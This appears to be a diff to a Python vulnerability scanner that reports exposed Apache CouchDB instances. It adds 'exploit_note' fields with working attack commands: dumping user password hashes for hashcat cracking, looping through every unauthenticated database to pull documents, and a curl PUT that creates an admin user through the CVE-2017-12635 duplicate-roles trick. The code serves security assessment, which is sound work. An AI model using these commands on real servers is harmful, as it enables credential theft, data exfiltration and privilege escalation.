@@ -204,7 +204,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     f"# then register a query_server / os_daemon to run commands",
                     "Create an admin account (PUT /_node/_local/_config/admins/<user>), "
                     "bind to localhost, firewall 5984/6984 + Erlang ports.",
-                    ["CWE-306", "CWE-269"], kind="couchdb_admin_party"))
+                    ["CWE-306", "CWE-269"], kind="couchdb_admin_party",
+                    exploit_note=(
+                        "curl -s http://<ip>:<port>/_users/_all_docs?"
+                        "include_docs=true | jq '.rows[].doc | "
+                        "{n:.name,h:.derived_key}' ; then hashcat -m 12100 "
+                        "(PBKDF2-SHA1) the derived keys."),
+                    depth_tier="t2"))
             if pr.get("unauth_dbs"):
                 dbs = pr.get("dbs") or []
                 user_dbs = [d for d in dbs if not d.startswith("_")]
@@ -221,7 +227,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     f"curl -s {base}/_all_dbs ; "
                     f"curl -s {base}/<db>/_all_docs?include_docs=true | head",
                     "Require authentication (create admins), bind to localhost, firewall 5984.",
-                    ["CWE-306"], kind="couchdb_unauth_dbs"))
+                    ["CWE-306"], kind="couchdb_unauth_dbs",
+                    exploit_note=(
+                        "for db in $(curl -s http://<ip>:<port>/_all_dbs | jq -r "
+                        "'.[]' | grep -v ^_); do curl -s http://<ip>:<port>/$db/"
+                        "_all_docs?include_docs=true\\&limit=5; done"),
+                    depth_tier="t2"))
             if ver and _old_version(ver):
                 out.append(_finding(
                     "high", "Apache CouchDB < 2.1.1 - unauth privesc -> RCE chain", tgt,
@@ -231,7 +242,14 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "curl",
                     f"curl -s {base}/   # confirm version, then the 12635/12636 chain",
                     "Upgrade CouchDB to 2.1.1 / 1.7.0 or later.",
-                    ["CWE-269", "CWE-94"], kind="couchdb_version"))
+                    ["CWE-269", "CWE-94"], kind="couchdb_version",
+                    exploit_note=(
+                        "curl -s -X PUT http://<ip>:<port>/_users/"
+                        "org.couchdb.user:recce -H 'Content-Type: application/json' "
+                        "-d '{\"type\":\"user\",\"name\":\"recce\",\"roles\":"
+                        "[\"_admin\"],\"roles\":[],\"password\":\"pw\"}' - only in "
+                        "scope."),
+                    depth_tier="t0"))
     return out
 
 
